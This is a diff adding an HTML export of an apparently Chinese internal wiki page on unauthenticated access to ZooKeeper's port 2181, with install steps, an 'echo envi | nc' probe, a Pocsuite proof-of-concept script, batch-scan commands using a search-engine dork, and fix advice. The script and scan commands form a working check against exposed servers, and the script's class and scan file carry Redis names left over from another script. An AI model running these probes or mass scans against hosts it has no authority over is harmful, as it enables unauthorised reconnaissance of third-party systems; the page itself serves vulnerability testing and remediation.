@@ -1,0 +1,167 @@
+                    
+    
+                    
+    
+                    
+    
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>查看源</title>
+        <link rel="canonical" href="/pages/viewpage.action?pageId=$action.page.id" />
+        <script>
+window.WRM=window.WRM||{};window.WRM._unparsedData=window.WRM._unparsedData||{};window.WRM._unparsedErrors=window.WRM._unparsedErrors||{};
+WRM._unparsedData["com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"]="\u0022\u0022";
+if(window.WRM._dataArrived)window.WRM._dataArrived();</script>
+<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<!--[if lt IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lt+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<!--[if lte IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lte+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<link type="text/css" rel="stylesheet" href="/s/d41d8cd98f00b204e9800998ecf8427e-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/259297d032f6c2eb68bc8778db0e9ca5/_/download/contextbatch/css/plugin.viewsource,-_super/batch.css" data-wrm-key="plugin.viewsource,-_super" data-wrm-batch-type="context" media="all">
+<link type="text/css" rel="stylesheet" href="/s/05c9783eadef6eaefda0a664f5508375-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/606ed4d0b33417c38ad41c7240fd6541/_/download/contextbatch/css/page,-_super/batch.css?build-number=7201&amp;presenterForConfluenceLicensed=true" data-wrm-key="page,-_super" data-wrm-batch-type="context" media="all">
+<link type="text/css" rel="stylesheet" href="/s/05c9783eadef6eaefda0a664f5508375-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/606ed4d0b33417c38ad41c7240fd6541/_/download/contextbatch/css/page,-_super/batch.css?build-number=7201&amp;media=print&amp;presenterForConfluenceLicensed=true" media="print" data-wrm-key="page,-_super" data-wrm-batch-type="context">
+<link type="text/css" rel="stylesheet" href="/s/af45f723c07cfe9ea790812c17f81a33-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/c890abc318d78efad182b82f6ccc55df/_/download/contextbatch/css/editor-content,-_super/batch.css?confluence.table.resizable=true&amp;confluence.view.edit.transition=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
+<!--[if lte IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/af45f723c07cfe9ea790812c17f81a33-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/c890abc318d78efad182b82f6ccc55df/_/download/contextbatch/css/editor-content,-_super/batch.css?conditionalComment=lte+IE+9&amp;confluence.table.resizable=true&amp;confluence.view.edit.transition=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<link type="text/css" rel="stylesheet" href="/s/62670cd6c46dc9fd1c3fe85280142dff-T/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/5.1.8/_/download/batch/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource.css" data-wrm-key="ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource" data-wrm-batch-type="resource" media="all">
+
+    </head>
+
+    <body class="mceContentBody aui-theme-default wiki-content fullsize">
+        <p>&nbsp;</p>         <h1>一、漏洞简介</h1><p>Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。</p><p>漏洞评级：高危</p><p>参考链接：<a href="http://www.mamicode.com/info-detail-2175694.html">http://www.mamicode.com/info-detail-2175694.html</a></p><p>二、漏洞利用</p><p>ZooKeeper 安装：</p><p>Zookeeper的默认开放端口是2181</p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="f9a882c7-002e-4233-a56d-c57691d21bfa" data-macro-parameters="language=bash" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGU6bGFuZ3VhZ2U9YmFzaH0&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz
+tar -zxvf zookeepre-3.4.10.tar.gz
+cd zookeeper-3.4.10/
+cd conf/
+vi zoo.cfg</pre></td></tr></table><pre>###配置单机模式
+tickTime=2000    
+dataDir=/tmp/zookeeper/data    
+dataLogDir=/tmp/zookeeper/logs    
+clientPort=2181 
+</pre><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="ad1a6f7e-606c-4285-b9ba-25e21a8e7234" data-macro-parameters="language=bash" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGU6bGFuZ3VhZ2U9YmFzaH0&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>bin/zkServer.sh start //启动
+#启动client连接server
+bin/zkCli.sh -server localhost:2181 </pre></td></tr></table><p>执行以下命令即可远程获取该服务器的环境：</p><p>echo envi|nc 192.168.15.74 2181</p><p><img class="confluence-embedded-image confluence-external-resource" alt="技术分享图片" src="http://image.mamicode.com/info/201801/20180130142705141827.png" data-image-src="http://image.mamicode.com/info/201801/20180130142705141827.png"></p><h1>三、漏洞验证</h1><p>相关POC如下：</p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="520d855f-2274-491f-8e50-3c1685ff0a4c" data-macro-parameters="language=py|linenumbers=true" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGU6bGFuZ3VhZ2U9cHl8bGluZW51bWJlcnM9dHJ1ZX0&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+"""
+Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
+See the file 'docs/COPYING' for copying permission
+"""
+#命令行
+from pocsuite import pocsuite_cli
+#验证模块
+from pocsuite import pocsuite_verify
+#攻击模块
+from pocsuite import pocsuite_attack
+#控制台模式
+from pocsuite import pocsuite_console
+from pocsuite.api.request import req 
+from pocsuite.api.poc import register
+from pocsuite.api.poc import Output, POCBase
+
+class RedisPOC(POCBase):
+    vulID = '35'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
+    version = '1' #默认为1
+    vulDate = '2018-05-11' #漏洞公开的时间,不知道就写今天
+
+    author = 'wangqi' #  PoC作者的大名
+    createDate = '2018-05-11'# 编写 PoC 的日期
+    updateDate = '2018-05-11'# PoC 更新的时间,默认和编写时间一样
+    references = ['']# 漏洞地址来源,0day不用写
+    name = 'ZooKeeper Unauthorized access'# PoC 名称
+    appPowerLink = ''# 漏洞厂商主页地址
+    appName = 'ZooKeeper'# 漏洞应用名称
+    appVersion = 'all versions'# 漏洞影响版本
+    vulType = 'Information Disclosure'#漏洞类型,类型参考见 漏洞类型规范表
+    desc = '''
+        ZooKeeper 未授权访问
+    ''' # 漏洞简要描述
+    samples = []# 测试样列,就是用 PoC 测试成功的网站
+    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+
+
+    #验证漏洞 
+    def _verify(self):
+        #定义返回结果
+        result = {}
+        #获取漏洞url
+        vul_url = '%s' % self.url
+        #如果设置端口则取端口,没有设置则为默认端口
+        import re
+        from pocsuite.lib.utils.funs import url2ip
+        _port = re.findall(':(\d+)\s*', vul_url)
+        if len(_port) != 0:
+            _host = url2ip(vul_url)[0]
+            _port = url2ip(vul_url)[1]
+        else :
+            _host = url2ip(vul_url)
+            _port = 2181
+        payload = '\x65\x6e\x76\x69'
+        #检测漏洞
+        import socket
+        s = socket.socket()
+        socket.setdefaulttimeout(5)
+        try:
+            s.connect((_host, _port))
+            s.send(payload)
+            recvdata = s.recv(2048)
+            # print recvdata
+            if 'Environment' in recvdata:
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['URL'] = self.url
+                result['VerifyInfo']['Payload'] = payload
+        except Exception as e:
+            # return host
+            print e
+            pass
+        s.close()
+        return self.save_output(result)
+
+    #漏洞攻击
+    def _attack(self):
+        result = {}
+        # 攻击代码
+        return self._verify()
+
+    def save_output(self, result):
+        #判断有无结果并输出
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail()
+        return output
+
+register(RedisPOC)
+
+
+
+
+
+
+
+
+
+
+
+"""
+PoC 编写规范及要求说明 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md
+
+使用方法 https://github.com/knownsec/Pocsuite/blob/master/docs/translations/USAGE-zh.md
+
+集成 Pocsuite https://github.com/knownsec/Pocsuite/blob/master/docs/INTEGRATE.md
+
+
+钟馗之眼 批量验证
+pocsuite -r 1-redis-getshell.py --verify --dork "redis"  --max-page 50 --search-type host --report report.html
+
+
+pocsuite -r 1-redis-getshell.py --verify -f results.txt --threads 10 --report report.html
+
+"""</pre></td></tr></table><h1>四、漏洞修复</h1><p>1、禁止把Zookeeper直接暴露在公网</p><p>2、添加访问控制，根据情况选择对应方式（认证用户，用户名密码）</p><p>3、绑定指定IP访问</p>
+        <p>&nbsp;</p>
+    </body>
+</html>
